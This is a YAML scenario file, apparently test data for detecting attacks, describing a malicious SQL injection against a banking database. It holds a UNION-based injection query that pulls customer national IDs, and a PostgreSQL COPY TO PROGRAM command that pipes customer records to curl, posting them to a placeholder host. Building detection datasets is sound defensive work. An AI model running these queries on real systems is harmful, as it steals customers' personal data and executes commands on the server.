scenario_id: banking_sqli_mal_02
family_id: banking_sql_injection_02
domain: banking
matched_pair_id: banking_sqli_pair_02
matched_dimensions:
  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
  varied: [sql_content]
time_of_day: "22:50"
default_class: malicious
rule_engine_relationship: agrees
sessions:
  - session_label: inject
    role: batch_etl_service
    anchor: db
    timing:
      tempo: steady
      step_gaps_seconds: [2.5]
    events:
      - step_id: probe
        sql: "SELECT transaction_id, amount FROM transactions WHERE account_id = 0 UNION SELECT customer_id, national_id FROM customers"
      - step_id: exfil
        sql: "COPY (SELECT customer_id, national_id, address FROM customers) TO PROGRAM 'curl -sX POST https://mirror-b.datasink.example/ingest -d @-'"
        connects_to: {ip: "185.220.101.55", port: 4445}
